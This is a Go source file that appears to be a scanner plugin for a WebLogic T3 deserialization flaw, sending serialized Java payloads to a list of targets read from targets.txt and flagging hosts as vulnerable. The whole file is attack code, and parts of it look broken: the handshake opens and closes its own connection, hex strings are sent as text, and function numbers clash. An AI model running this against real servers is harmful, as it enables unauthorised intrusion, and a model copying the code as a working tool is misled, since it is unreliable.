package Plugins

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"regexp"
	"strings"
	"time"
)

func t3handshake3428(sock net.Conn, serverAddr string) {
	sock, err := net.DialTimeout("tcp", serverAddr, 5*time.Second)
	if err != nil {
		fmt.Println("[-] Error connecting to the server:", err)
		return
	}
	defer sock.Close()

	sock.Write([]byte{0x74, 0x33, 0x20, 0x31, 0x32, 0x2e, 0x32, 0x2e, 0x31, 0x0a, 0x41, 0x53, 0x3a, 0x32, 0x35, 0x35, 0x0a, 0x48, 0x4c, 0x3a, 0x31, 0x39, 0x0a, 0x4d, 0x53, 0x3a, 0x31, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x0a, 0x0a})
	time.Sleep(1 * time.Second)

	buf := make([]byte, 1024)
	_, err = sock.Read(buf)
	if err != nil {
		fmt.Println("[-] Error reading response:", err)
		return
	}
}

func buildT3RequestObject3428(sock net.Conn, rport int) {
	data1 := "000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400135b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b90ce589f1073296c0200007870737200267765626c6f6769632e726a766d2e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07"
	data2 := fmt.Sprintf("1a7727000d3234322e3231342e312e323237%02x8f%02x", rport>>8, rport&0xff)
	data3 := "2e312e32353461863d1d0000000078"
	data4 := "2e312e32353461863d1d0000000078"

	for _, d := range []string{data1, data2, data3, data4} {
		sock.Write([]byte(d))
		time.Sleep(2 * time.Second)
	}
}

func sendEvilObjData3428(sock net.Conn, data string) string {
	payload := "fe000000%08x" + PAYLOAD
	payload = fmt.Sprintf(payload, (len(payload)+8)/2)
	payload += data + "fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000"
	payload = fmt.Sprintf("%08x%s", (len(payload)+8)/2, payload)

	_, err := sock.Write([]byte(payload))
	if err != nil {
		fmt.Println("[-] Error sending data:", err)
		return ""
	}

	res := ""
	reader := bufio.NewReader(sock)
	count := 0
	for count < 5 {
		buf := make([]byte, 4096)
		n, err := reader.Read(buf)
		if err != nil {
			break
		}
		res += string(buf[:n])
		time.Sleep(100 * time.Millisecond)
		count++
	}

	return res
}

func checkVul3428(res, rip string, rport int) (int, string) {
	re := regexp.MustCompile(VER_SIG3)
	p := re.FindString(res)
	if p != "" {
		return 1, fmt.Sprintf("[+] 存在漏洞%s ", VUL[2])
	} else {
		return 0, fmt.Sprintf("[-] 已扫描 %s ", VUL[2])
	}
}

func run3248(rip string, rport int) (int, string) {
	serverAddr := fmt.Sprintf("%s:%d", rip, rport)
	sock, err := net.DialTimeout("tcp", serverAddr, 3*time.Second)
	if err != nil {
		fmt.Println("[-] Error connecting to the server:", err)
		return 0, ""
	}
	defer sock.Close()

	t3handshake3428(sock, serverAddr)
	buildT3RequestObject3428(sock, rport)
	rs := sendEvilObjData3428(sock, PAYLOAD)
	return checkVul3428(rs, rip, rport)
}

func Check3248() {
	filePath := "targets.txt"

	file, err := os.Open(filePath)
	if err != nil {
		fmt.Printf("无法打开文件：%s\n", err)
		return
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			parts := strings.Split(line, ":")
			if len(parts) != 2 {
				fmt.Printf("无效的目标格式：%s\n", line)
				continue
			}

			targetHost := parts[0]
			targetPort := parts[1]

			// 将端口转换为整数
			var portInt int
			_, err := fmt.Sscanf(targetPort, "%d", &portInt)
			if err != nil {
				fmt.Printf("无效的端口：%s\n", targetPort)
				continue
			}
			_, result := run3248(targetHost, portInt)
			fmt.Println(result)

		}
	}
}
